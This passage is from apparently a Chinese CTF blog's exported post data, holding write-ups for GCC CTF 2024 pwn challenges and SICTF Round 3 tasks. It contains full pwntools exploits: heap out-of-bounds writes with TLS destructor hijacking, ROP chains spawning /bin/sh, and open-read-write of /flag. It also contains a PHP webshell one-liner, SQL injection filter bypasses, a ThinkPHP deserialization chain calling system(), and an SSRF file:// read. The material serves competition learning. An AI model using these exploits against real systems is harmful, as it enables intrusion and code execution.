rbp; pop rbp; pop r12; ret;0x000000000003c33b: mov rbp, r9; jmp rdx;0x000000000007eaef: mov rbp, rax; mov rax, rbp; pop rbp; pop r12; ret;0x0000000000108448: mov rbp, rcx; push rbx; mov rbx, rdi; mov rdi, rcx; sub rsp, 8; call rsi;0x0000000000074042: mov rbp, rdx; mov rdi, qword ptr [rdi + 0xe0]; call rax;  选择使用这个 0x0000000000099ab4，后面的call rax 肯就需要是leave; ret  0x0000000000099ab4: mov rbp, qword ptr [rsi + 8]; mov rax, qword ptr [rbx + 0x40]; test byte ptr [rbx + 0x50], 1; jne 0x99a98; mov rdi, rsi; call rax;‍exploit  最终from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)rl      = lambda                    :io.recvline()itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)binary = './flag_roulette'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)gdbscript = '''#brva 0x1709b * __call_tls_dtors#continue'''.format(**locals())io = start(binary)def rol(num,i):    part1 = num &lt;&lt; i    part1 &amp;= (1 &lt;&lt; 64) - 1    part2 = num &gt;&gt; (64- i)    return part1 + part2def add(size,idx,data):    ru('&gt; ')    sl('1')    ru(\"How many bytes would you like to bet on ?\\n&gt; \")    sl(str(size)) # 0x7f ~ 0x21000    ru('Please choose the index of the byte to modify\\n&gt; ')    sl(str(idx))    ru('Please set the new value of this byte\\n&gt; ')    sl(str(data))def rm():    ru('&gt; ')    sl('2')def write_b(offset,b):    add(0x21000,offset,b)    rm()def write_Q(addr,c):    global heap_ptr    offset = addr - heap_ptr    data = p64(c)    for i in range(8):        print(offset+i,data[i])        write_b(offset+i,data[i])# OOBwrite_b(0x1f8398, 1)'''libc leak'''add(0x21000,0x1f9798, 0x20)ru('\\x00'*4)libc_base = uu64(r(6)) - 1923632tls_base  = libc_base - 10432heap_ptr = libc_base - 0x24ff0rm()magic_gadget = libc_base + 0x0000000000099ab4# rop base = tls_base + 0x60rsi = libc_base + 1914944 + 8rbp = tls_base + 0x60write_Q(rsi,rbp)# col raxrbx = tls_base - 0x48 + 0x40rax = libc_base + 0x000000000004e3b9 # leave; ret;write_Q(rbx,rax)rop_base = tls_base + 0x68libc.address = libc_baserop = ROP(libc)rax = rop.find_gadget(['pop rax','ret'])[0]rdi = rop.find_gadget(['pop rdi','ret'])[0]rsi = rop.find_gadget(['pop rsi','ret'])[0]rdx = rop.find_gadget(['pop rdx','ret'])[0]syscall = rop.find_gadget(['syscall','ret'])[0]read_rop =[    rax, 0,    rdi, 0,    rsi, rop_base+0x48,    rdx, 0x400,    syscall]for i in range(len(read_rop)):    write_Q(rop_base+(i*8),read_rop[i])# clear random valueswrite_Q(tls_base+0x30,0x00)write_Q(tls_base-0x50, tls_base-0x48)write_Q(tls_base-0x48, rol(magic_gadget,0x11))write_Q(tls_base-0x40, 0x44454647)lss('libc_base')lss('tls_base')#gdb.attach(io,gdbscript)add(0x21000,1,1)ru('&gt; ')sl('3')pause()orw_rop_addr = rop_base+0x48orw_rop  = p64(rax) + p64(2) + p64(rdi) + p64(orw_rop_addr+0xb8) + p64(rsi) + p64(0) + p64(rdx) + p64(0) + p64(syscall)orw_rop += p64(rdi) + p64(3) + p64(rsi) + p64(orw_rop_addr+0xb8) + p64(rdx) + p64(0x100) + p64(libc.sym['read'])orw_rop += p64(rdi) + p64(1) + p64(rsi) + p64(orw_rop_addr+0xb8) + p64(rdx) + p64(0x100) + p64(libc.sym['write'])orw_rop += b'/flag'.ljust(0x10,b'\\x00')sl(orw_rop)itr()  调试‍​call rax​​​  执行 magic gadget部分已经成功修改 rax 和 rbp ,​​‍  然后 call rax ,执行 leave 进行栈迁移​​​​‍执行一个 read，把ORW 操作部分的 rop 读到当前栈上​​‍  ORW 部分​​​​‍至此结束，总之学到了不少东西，一开始不会，跟着大佬的wp solve  mp_ 结构体的一些作用，一些关于malloc 和 free 的部分知识  一些ROPgadget 找不到，而 ropper 可以找到的gadget‍END  参考大佬的博客地址https://chovid99.github.io/posts/gcc-ctf-2024/🧎🧎🧎🧎🧎🧎🧎🧎🧎🧎🧎🧎🧎‍‍  下面俩题 没啥可看的‍Cuttin_String这题不是很难所以就随便写写  源码BITS 64; -------------------------------------------------------; STATIC VARIABLESsection .rdata; //// [Banner messages] ////main_message db 10,\"Cuttin'String, the smallest string cutting tool\",10,\"-----------------------------------------------\",10, 0len_str_message db \"Enter the length of the string (in decimal) &gt; \", 0inp_str_message db \"Enter the string to cut &gt; \", 0delimiter_message db 10,10,\"---\",10,0; //// [Error messages] ////error_msg_not_int db \"Error. Enter a number in decimal.\",10,0; -------------------------------------------------------; ASM CODE :)section .textglobal _start; //// [Utils] ////; @Type: Macro; Prepare sys_read syscall__LOAD_SYS_READ:\txor rax, rax\tret; @Type: Macro; Prepare sys_write syscall__LOAD_SYS_WRITE:\txor rax, rax\tmov rdi, 1\tinc al\tret; @Type: Function; @Quick: _PUTS(str*, len=0); @Desc: Print the given string in stdout; \t\t If len is not 0, display len bytes of str; \t\t Else, it continues until reaching a null-byte_PUTS:\t; Setup stack frame\tpush rbp\tmov rbp, rsp\t; Get the arguments\tmov rsi, [rsp+24] ; ptr*\tmov rdx, [rsp+16] ; len\t; Check if len parameter is passed\ttest rdx, rdx\tjne skip_determine_lenfind_null_byte_index:\tmov al, rsi[rdx]\tinc rdx\tcmp al, 0\tjne find_null_byte_indexskip_determine_len:\t; PRINT the string\tcall __LOAD_SYS_WRITE\tdec rdx\tsyscall\tleave\tret; @Type: Function; @Quick: _read_and_print_str(len); @Desc: Read str from stdin and print the len first bytes to stdout_read_and_print_str:\t; Setup stack frame\tpush rbp\tmov rbp, rsp\t; Get len argument\tmov r10, [rsp+16] ; len\t; Allocate stack buffer of 512 bytes\tsub rsp, 512\t; Read 0x512 bytes from stdin\tcall __LOAD_SYS_READ\txor rdi, rdi\tmov rsi, rsp\tmov rdx, 0x512\tsyscall\t; Print the string cutted\tpush rsi ; Str\tpush r10 ; len\tcall _PUTS\tadd rsp, 8\t; Return from function\tleave\tret; @Type: Function; @Quick: _get_len_str(void) -&gt; len:r10; @Desc: Reads decimal from stdin and convert it to usable number._get_len_str:\t; Setup stack frame\tpush rbp\tmov rbp, rsp\t; Allocate 8 bytes buffer\tsub rsp, 8\t; Read 8 bytes from stdin\tcall __LOAD_SYS_READ\txor rdi, rdi\tmov rsi, rsp\tmov rdx, 8\tsyscall\t; Prepare str to int\txor r10, r10\t; Reset output\txor rcx, rcx \t; Reset counter\t; Perform str to int by looping through each digitloop_over_digits:\txor rax, rax \t; Reset local output\tmov al, rsp[rcx] ; Read read char from str\t; IF char == null_byte\tcmp al, 0\tje end_loop_number\t; IF char == new_line\tcmp al, 10\tje end_loop_number\t; IF char &lt; \"0\"\tcmp al, '0'\tjb _error_not_int\t; IF char &gt; \"9\"\tcmp al, '9'\tja _error_not_int\t; IF its the units digit, dont multiply by ten before adding\ttest rcx, rcx\tje skip_mul\t; Multiply the result by ten\timul r10, r10, 10skip_mul:\t; Digit ascii value to actual value\tsub rax, '0'\t; Add digit to result\tadd r10, rax\t; Continue looping through the digits until reaching the end\tinc rcx\tcmp rcx, 8\tjne loop_over_digitsend_loop_number:\t; Clean 8 bytes buffer\tadd rsp, 8\t; Clean stackframe and return\tleave\tret; @Type: Function; @Quick: _main_loop(void); @Desc: Perform all the program operations_main_loop:\t; Setup stack frame\tpush rbp\tmov rbp, rsp\t; Display the length input message\tlea rax,[rel len_str_message]\tpush rax\tpush 0\tcall _PUTS\tadd rsp, 16\t; Read length from stdin in decimal\tcall _get_len_str\t; Add 1 to result because of later calculations\tadd r10, 1\t; Display the string input message\tlea rax,[rel inp_str_message]\tpush rax\tpush 0\tcall _PUTS\tadd rsp, 16\t; Read str from stdin and print it\tpush r10\tcall _read_and_print_str\tadd rsp, 8\t; Display the delimiter\tlea rax,[rel delimiter_message]\tpush rax\tpush 0\tcall _PUTS\tadd rsp, 16\tleave\tret; //// [Program] ////_start:\t; Display banner message\tlea rax,[rel main_message]\tpush rax\tpush 0\tcall _PUTS\tadd rsp, 16\tmov rbp, rsp__main_loop:\tcall _main_loop\tjmp __main_loop; //// [Error Handlers] ////; @Type: ERROR_HANDLER; @Quick: _error_not_int(void); @Raise_condition: When converting str to int, if a character is not a digit._error_not_int:\t; PUTS error_msg_not_int\tlea rax,[rel error_msg_not_int]\tpush rax\tpush 0\tcall _PUTS\tadd rsp, 8\t; SYS_EXIT(0)\txor edi, edi\tmov rax, 0x3c\tsyscall‍#!/bin/bashnasm -f ELF64 -o chall.o chall.asmgcc -z noexecstack -o chall chall.o -nostdlibrm chall.o‍没有 引用libc.so, 可以在 stack 泄露 ld.so 的地址 然后从ld.so 上 找 gadget​ 打 ，然后栈溢出打ROP‍  exploitfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)rl      = lambda                    :io.recvline()itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)binary = './chall'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)gdbscript = '''#continue'''.format(**locals())io = start(binary)ru('(in decimal) &gt; ')sl('2222222')ru('the string to cut &gt; ')sl(b'\\x00A')r(8)ld_base = uu64(r(8)) - 228016r(8)stack = uu64(r(8))ru('(in decimal) &gt; ')sl('2222222')rax_rdx_rbx_ret = ld_base + 0x000000000001ee12 # pop rax ; pop rdx ; pop rbx ; retrsi_ret         = ld_base + 0x000000000000469a # pop rsi ; retrdi_ret         = ld_base + 0x0000000000003b63 # pop rdi ; retsyscall         = ld_base + 0x000000000000b708 # syscallpay = flat([    rax_rdx_rbx_ret,0x3b,0,0,    rdi_ret, stack-208,    rsi_ret, 0,    syscall    ])ru('the string to cut &gt; ')gdb.attach(io)sl(b'/bin/sh'.ljust(0x100,b'\\x00')+0x108*b'A' + pay)#gdb.attach(io,gdbscript)lss('ld_base')lss('stack')itr()‍Baby_bof  高版本 glibc 攻击 tls_dtor_list​,  main​ 函数正常 return 退出，或者 执行 exit();​ 都会触发这个  正常情况下 tls_dtor_list​ 是空值.（类似一个hook 函数）​​  程序漏洞，简单解释​​‍  可以利用 printf 泄露 地址，然后泄露 Canary​（需要覆盖部分canary然后泄露它下面的 一个随机值，main return 时候会检测）  很简单，可以参考 高版本tls_dtor_list的利用。‍  exploitfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)rl      = lambda                    :io.recvline()itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)binary = './baby_bof'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)gdbscript = '''brva 0x002BCBb *__call_tls_dtors#continue'''.format(**locals())io = start(binary)def sp(pay):    ru('&gt; ')    sl('1')    ru('&gt; ')    s(pay)def s_exit():    ru('&gt; ')    sl('2')pay = b'A' * 0x68sp(pay)ru(pay)tls_base    = uu64(r(6)) - 3229322 - 198libc_base   = tls_base + 5248system  = libc_base + libc.sym['system']bin_sh  = libc_base + next(libc.search(b'/bin/sh'))pay = 0xbf8 * b'C' + b'\\n'sp(pay)ru(pay)canary = uu64(r(7)) &lt;&lt; 8rand   = uu64(r(8))def rol(num,i):    part1 = num &lt;&lt; i    part1 &amp;= (1 &lt;&lt; 64) - 1    part2 = num &gt;&gt; (64 - i)    return part1 + part2# 0xbd0#&gt;&gt;&gt; hex(0xffffffffffffff90 - (1 &lt;&lt; 64))# '-0x70'pay = 0xa * p64(canary)pay = pay.ljust(0xbd0-0x70,b'\\x00')pay += p64(tls_base-0x70+8)pay += p64(rol(system,0x11))pay += p64(bin_sh)pay  = pay.ljust(0xbd0+0x10,b'\\x00') # mov rax,qword ptr fs:[0x10]pay += p64(tls_base) #pay  = pay.ljust(0xbd0+0x30+8,b'\\x00')sp(pay)lss('tls_base')lss('libc_base')lss('canary')lss('rand')#gdb.attach(io,gdbscript)s_exit()itr()‍​​​​‍‍"
  },
  
  {
    "title": "2024-SICTF Round#3-WriteUps_by_AhiSec",
    "url": "/posts/SICTF-Round-3-WriteUps_by_AhiSec/",
    "categories": "CTF",
    "tags": "CTF",
    "date": "2024-02-16 18:42:08 +0800",
    





    
    "snippet": "  感谢队友带我飞.ReverseBaby_C++‍1.签到题 shift + F12直接看见flag​​‍Ez_pyc‍1.在线网址反编译不全，发现是3.8的python版本，直接使用3.8的uncompyle6反编译出源码​​2.一个数独游戏可以求解不过观察判断条件，发现如果数独正确输出的flag是正确flag的md5后的值提交一下发现flag就是那个md5 ​​‍ArtBreaker‍...",
    "content": "  感谢队友带我飞.ReverseBaby_C++‍1.签到题 shift + F12直接看见flag​​‍Ez_pyc‍1.在线网址反编译不全，发现是3.8的python版本，直接使用3.8的uncompyle6反编译出源码​​2.一个数独游戏可以求解不过观察判断条件，发现如果数独正确输出的flag是正确flag的md5后的值提交一下发现flag就是那个md5 ​​‍ArtBreaker‍  比较抽象IDA打开发现节点过多修改节点个数限制，发现flag在流程图里面​​‍‍SweetTofu‍  简单的签到，主函数就是用户输入并且判断输入的长度是否大于0x100,调用v1这个函数指针加密直接打断点运行到v1指向的函数​​2.发现就是一个异或0x66而已​​3.解密得到flag​​‍Battle City‍  坦克大战通关后会生成一个win.png的二维码扫码得到flag​​​​‍‍(🩸)[进阶]CloseMe‍首先翻到下面发现有一个xor，解密一下看看得到一段hint​​​​  ++v64 == 16也就是说需要按16次​​判断按的是否为 0 1​​3.根据调试的结果这个代码就是将输入的 0 1倒叙后将输入的01当作整数，例如输入: 1011 将会变成 1101注意是整数 1101而不是二进制转十进制​​4.调试发现将输入的后两位截取​​截取前14位和后2位拼接，相当于把最后两位放到前面来了​​  sub_7FF7845EAEC0函数实际执行的代码其实就只有这一段，这一段的作用是将变换后的01转为整数也就是二进制转十进制，return前 « 16​​​​  Check代码判断二进制转十进制再左移16后是不是0xA9F10000，确定这个为check的原因是如果不为0xA9F10000则会跳转到那个弹窗口的分支中​​7.也就是说正确的输入变化后的十进制为0xA9F1，将0xA9F1交换后再倒叙得到flag​​‍‍Misc‍(🩸)真签到‍1.压缩包要密码爆破不开，将压缩包拖入16进制编辑器发现HEX值解密得到一串看似BASE32的字符串但是其实是字母加密，字母加密的特点就是加密后的字母很重复，解密得到压缩包密码 2024HappyNewYear​​​​​​2.打开音频文件，查看频谱图记得缩小一下发现一段字符根据jpg图片的文件名猜测是steghide隐写这个是key不过发现不对​​  查看音频文件的文件名 Lagrange is Capatlized提示Lagrange 是大写的​​​​4.解密得到flag​​‍‍‍‍问卷调查‍‍‍‍  ??????‍签到签到‍  扫描微信公众号回复”SICTF{Round3，我来辣~}”获取flag‍GeekChallege‍from pwn import *sl      = lambda data               :io.sendline(data)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)context.log_level = 'debug'io = remote('yuanshen.life',33312)ru('Tip:len(array)=5&amp;&amp;len(passwd)=114')pwd = ''n = 1s = []#s = 'DDD_J_JDL__DLJDDa'# DDD_J_JDL__DLJDDa_a_aD_JLJJa_JJJk000000000000000000000000000000000000000000000000000000000000000000000000000000000\\nfor i in range(120):    for i in range(32,127):        ru('&gt;')        p = pwd + chr(i)        p = p.ljust(114,'0')        sl(p)        t = io.recvline().decode()        print(t)        if n * '1' in t:            pwd += chr(i)            n += 1            if chr(i) not in s:                s.append(chr(i))            break    if len(s) == 5:        break        print(pwd)for i in range(120):    for i in s:        ru('&gt;')        p = pwd + i        p = p.ljust(114,'0')        sl(p)        t = io.recvline().decode()        print(t)        if n * '1' in t:            pwd += i            n += 1            break        print(pwd)io.interactive()‍​​‍‍(🩸🩸)日志分析1我是先找的计划任务直接过滤4698​​注意名称不能有斜杠            callback      C:\\windows\\system32\\windows_attack.exe      这两个答案就找到了‍然后就是黑客创建的用户名过滤4720​​attack$‍接着是黑客添加的用户组过滤4732​​Administrators‍然后就是黑客接入的ip地址这个需要通过一个工具LogParser.exe过滤登陆成功的事件 LogParser.exe -i:EVT \"SELECT TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,8,'|') as EventType,EXTRACT_TOKEN(Strings,5,'|') as username,EXTRACT_TOKEN(Strings,18,'|') as LoginipFROM 1.evtx where EventID=4624\"​​192.168.222.200‍最后就是远程登陆用户根据题目的提示​​​​最后的flag​​‍‍日志分析2使用脚本解码一下from urllib.parse import unquotef = open('access.log.1','r').readlines()f1 = open('1.log','a')for i in f:    dd = i.strip()    text = unquote(dd, 'utf-8')    f1.write(text+\"\\n\")在最后一行，我们就可以发现 webshell连接工具的名称和版本号，以及黑客的IP地址​​看最上面发现有大量的请求发往login​​再根据给的提示，四字攻击手法，很明显就是暴力破解沿着这个爆破的请求翻就可以发现下面的sql注入​​最后flag是：            SICTF{10.11.35.95      暴力破解      sqlmap      1.2.4.18      蚁剑      2.1}      ‍‍WHO?WHO?WHO压缩包密码需要爆破​​​​解压得到以下内容​​零宽直接在线网站解​​U2FsdGVkX19uvldJ6CGUNff3B28QEdIjZqgUh98K+/0J16ELU8WVQydohw4P5+2MjbhTLQHNOpcoOd7kSRgy8pwpovCmimdD8M0IbYUeXjNKYePL/WP4PCMaOJHAW3HRb7IEoDDH1NYh3o5NwMmcFEqy1ujf72VgQIQkaeYFFFE=rabbit解密钥为shumu​​GTAGAGCTAGTCCTT{GGGTCACGGTTC_GGGTCACGGTTC_GAACGGTTC_GTAGTG_GCTTCA_GTAGACGTGGCGGTG_GTAGACTCA_TATGACCGG_GCTCGGGCT}百度一搜​​说是DNA序列，接着toolsFX工具解​​注意一下下划线的位置就行了SICTF{Q1A0_Q1A0_GA0_SU_N1_SHUMU_SH1_ZHA_NAN}‍‍‍神秘的流量‍  数据包可以得到这个压缩包​​‍  用到的工具 脚本https://github.com/DidierStevens/Beta/blob/master/cs-extract-key.pyhttps://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py  解密cs流量  使用 cs-extract-key.py​ 工具 可以得到 AES key : HMAC key​python3 cs-extract-key.py -c 000001b01c14d0909382a212e81996ca13bcbcfc9e6396b054f7663e440053e18cf02547016dc37d5f82ea562b8e24d6e69ce890f34dc45f64d3dcd5cb2e5bce3e34d17b4ebd4890a69463ca8c92db79a52f21f8844084eb41aa70fa1b8d047537ba1c898a6437d57b43d99b97bad26c31c0d4f67b768663a459cef8e70d1f1b5ae1656de024c6a0ec66b8d2eb22817451c1a9f924e876b290cbd4b6e0fcc2170bf45b906904b4b0f8ff305064c844308a90d44da3f612b00bdb18c5ad5f1a8f300dc348e0f7aa98c4579dfa297a52b01f1f12709df4939b72e46ce81747e99003d63232e93a0d7397474175a20100d5daaf1c63840c8ce465afeba65d2fc2f43223cf1108bcf09d6daa0096b62c9c89542c257afa98179cbbcbd6729694fbd738cd840bb9efa6ac5e42a89749577efddea42af24abdd3f6af3e001143d2d9995b8dedb3914db8dc00fbf5623116f489164f94b995a995de8a6ded650808c4382247ea5261edb700afb6850280fb45edbbec053f9507faa739b69efd281183127115861bd5ce038244a57047368f72d7c35fd05b2e0381b62b41a7f89f4c948c9b3b987421f2ace96e4d9a362b66c5dc1acd2403 dmp.dmp​​‍  然后用 cs-parse-http-traffic.py​ 就可以拿到明文# AES key position: 0x003662d8# AES Key:  e453d7f06b53a1638b0087236bae5d3b# HMAC key position: 0x003695f8# HMAC Key: 2bfb11c55658a2050e501c3571ebe676python3 cs-parse-http-traffic.py -k 2bfb11c55658a2050e501c3571ebe676:e453d7f06b53a1638b0087236bae5d3b  21.pcapng -e​​​​‍SICTF{b50936c7-b60d-411e-a91f-304937164b9c}‍                    参考 [从pcap包中解密cobalt-strike流量        fdvoid0's blog (fdlucifer.github.io)](https://fdlucifer.github.io/2022/01/05/decrypt-cs-traffic/)            ‍‍(🩸🩸)New Year’ s regret‍  根据题目提示掩码爆破出压缩包密码​​  output.txt一堆0 1猜测是0 1转图片在压缩包最底下有一段hex值，直接转不行需要将hex值倒叙一下得到宽高写脚本得到一张图片​​​​​​3.乐谱密码解密得到一部分呢flag​​​​4.HXD打开图片发现有一个压缩包，分离一下发现一段BASE64脚本解密最后转图片二维码扫码得到一部分flag​​​​​​​​  还有一张图片根据题目提示猜测是武器星级，图片识别发现是战双帕弥什的武器根据图鉴写下星级https://wiki.biligame.com/zspms/%E6%AD%A6%E5%99%A8​​HEX解码发现不对，观察数字只有 4 5 6猜测是摩斯密码， 4 –》.  5 -》空格 6 -》-​​​​5.得到最后一部分flag，将的一部分的flag按下划线分割转小写得到flag​​‍‍Web100_upload‍​​‍&lt;?=`cat /flag`?&gt;​​‍‍hacker跑了一遍字典，发现注入的东西有很多，空格、or、and，但是没有禁用union和select​​那就很明显了，联合查询user()发现最高权限是root，然后我就试试能不能读取文件，发现load_file可以读取&lt;?phpecho \"&lt;!--flag在flag表里--&gt;\";echo \"&lt;br&gt;\";$servername = \"localhost\";$username = \"root\";$password = \"123456\";$dbname = \"ctf\";// 创建连接$conn = new mysqli($servername, $username, $password, $dbname);if ($conn-&gt;connect_error) {    die(\"Connection failed: \" . $conn-&gt;connect_error);}$username=strtolower($_GET['username']);$sensitive_keywords = array(\" \",\"handler\", \"like\", \"or\", \"-~\", \"--\", \"--+\", \"information\", \"xor\", \"and\", \";\", \"&amp;\", \"|\", \"order\", \"floor\",\"sys_tables\",\"sys_columns\",\"sys.schema_table_statistics_with_buffer\",\"sys.schema_table_statistics\",\"mid\", \"ascii\");// 检查参数中是否包含敏感关键词foreach ($sensitive_keywords as $keyword) {    if (strpos($username, $keyword) !== false) {        // 如果参数中包含敏感关键词，弹窗提示用户        die(\"&lt;script&gt;alert('hacker');&lt;/script&gt;\");        // 可以选择终止脚本执行或者做其他处理        exit;    }}$sql=\"select id from flag where id='$username'\";$result = $conn-&gt;query($sql);if ($result-&gt;num_rows &gt; 0) {    // 输出每一行记录的 love 字段值    while($row = $result-&gt;fetch_assoc()) {        echo \"          \" . $row[\"id\"] . \"&lt;br&gt;\";    }} else {    echo \"0 结果\";}// echo $result-&gt;num_rows;// 关闭数据库连接$conn-&gt;close();?&gt;根据它这个表里面的过滤信息，我们直接无列名注入即可payload:http://yuanshen.life:35522/?username=alice'union/**/select/**/`2`/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/flag)a%23​​‍Oyst3rPHP​​扫描目录可以得到一个www.zip由于这是thinkphp框架写的，所以网站的首页是在app—-controller目录里​​&lt;?phpnamespace app\\controller;use app\\BaseController;class Index extends BaseController{    public function index()    {\t\techo \"RT，一个很简单的Web，给大家送一点分,再送三只生蚝，过年一起吃生蚝哈\";        echo \"&lt;img src='../Oyster.png'\".\"/&gt;\";  \t\t$payload = base64_decode(@$_POST['payload']);        $right = @$_GET['left'];        $left = @$_GET['right'];  \t\t$key = (string)@$_POST['key'];        if($right !== $left &amp;&amp; md5($right) == md5($left)){  \t\t\techo \"Congratulations on getting your first oyster\";\t\t\techo \"&lt;img src='../Oyster1.png'\".\"/&gt;\";  \t\t\tif(preg_match('/.+?THINKPHP/is', $key)){                die(\"Oysters don't want you to eat\");            }            if(stripos($key, '603THINKPHP') === false){                die(\"！！！Oysters don't want you to eat！！！\");            }\t\t\techo \"WOW！！！Congratulations on getting your second oyster\";\t\t\techo \"&lt;img src='../Oyster2.png'\".\"/&gt;\";  \t\t\t@unserialize($payload);\t\t\t//最后一个生蚝在根目录，而且里面有Flag？？？咋样去找到它呢？？？它的名字是什么？？？\t\t\t//在源码的某处注释给出了提示，这就看你是不是真懂Oyst3rphp框架咯！！！\t\t\t//小Tips：细狗函数┗|｀O′|┛ 嗷~~        }    }\tpublic function doLogin()    {    /*emmm我也不知道这是what，瞎写的*/        if ($this-&gt;request-&gt;isPost()) {            $username = $this-&gt;request-&gt;post('username');            $password = $this-&gt;request-&gt;post('password');               if ($username == 'your_username' &amp;&amp; $password == 'your_password') {                  $this-&gt;success('Login successful', 'index/index');            } else {                    $this-&gt;error('Login failed');            }        }    }}很简单的逻辑，就是md5弱比较、正则回溯，然后反序列化而已序列化的链子直接摘抄网上的就行了&lt;?php namespace think\\model\\concern; trait Attribute {     private $data = [\"key\"=&gt;\"cat /Oyst3333333r.php\"];     private $withAttr = [\"key\"=&gt;\"system\"]; } namespace think; abstract class Model {     use model\\concern\\Attribute;     private $lazySave = true;     protected $withEvent = false;     private $exists = true;     private $force = true;     protected $name;     public function __construct($obj=\"\"){         $this-&gt;name=$obj;     } } namespace think\\model; use think\\Model; class Pivot extends Model {} $a=new Pivot(); $b=new Pivot($a); echo base64_encode(serialize($b));import requestspay = \"TzoxNzoidGhpbmtcbW9kZWxcUGl2b3QiOjc6e3M6MjE6IgB0aGlua1xNb2RlbABsYXp5U2F2ZSI7YjoxO3M6MTI6IgAqAHdpdGhFdmVudCI7YjowO3M6MTk6IgB0aGlua1xNb2RlbABleGlzdHMiO2I6MTtzOjE4OiIAdGhpbmtcTW9kZWwAZm9yY2UiO2I6MTtzOjc6IgAqAG5hbWUiO086MTc6InRoaW5rXG1vZGVsXFBpdm90Ijo3OntzOjIxOiIAdGhpbmtcTW9kZWwAbGF6eVNhdmUiO2I6MTtzOjEyOiIAKgB3aXRoRXZlbnQiO2I6MDtzOjE5OiIAdGhpbmtcTW9kZWwAZXhpc3RzIjtiOjE7czoxODoiAHRoaW5rXE1vZGVsAGZvcmNlIjtiOjE7czo3OiIAKgBuYW1lIjtzOjA6IiI7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319\"url = \"http://yuanshen.life:37346/?left=s1885207154a&amp;right=s1502113478a\"data = {    \"key\":\"a\"*1000000+\"603THINKPHP\",    \"payload\":pay}res = requests.post(url=url,data=data)print(res.text)​​‍‍EZ_SSRF源代码&lt;?phphighlight_file(__file__);error_reporting(0);function get($url) {    $curl = curl_init();    curl_setopt($curl, CURLOPT_URL, $url);    curl_setopt($curl, CURLOPT_HEADER, 0);    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);    $data = curl_exec($curl);    curl_close($curl);    echo base64_encode($data);    return $data;}class client{    public $url;    public $payload;    public function __construct()    {        $url = \"http://127.0.0.1/\";        $payload = \"system(\\\"cat /flag\\\");\";        echo \"Exploit\";    }    public function __destruct()    {        get($this-&gt;url);    }}// hint:hide other fileif(isset($_GET['Harder'])) {    unserialize($_GET['Harder']);} else {    echo \"You don't know how to pass parameters?\";}?&gt;很简单的一道题，反序列化然后通过ssrf漏洞直接读取flag.php文件&lt;?phpclass client{    public $url;    public $payload;}$a = new client;$a-&gt;url = \"file:///var/www/html/flag.php\";echo serialize($a);?&gt;这里应该算是一个小小的非预期吧，因为出题人的目的应该是在admin.php里&lt;?phperror_reporting(0);include \"flag.php\";highlight_file(__FILE__);$allowed_ip = \"127.0.0.1\";if ($_SERVER['REMOTE_ADDR'] !== $allowed_ip) {    die(\"You can't get flag\");} else {    echo $flag;}?&gt;​​‍‍Not just 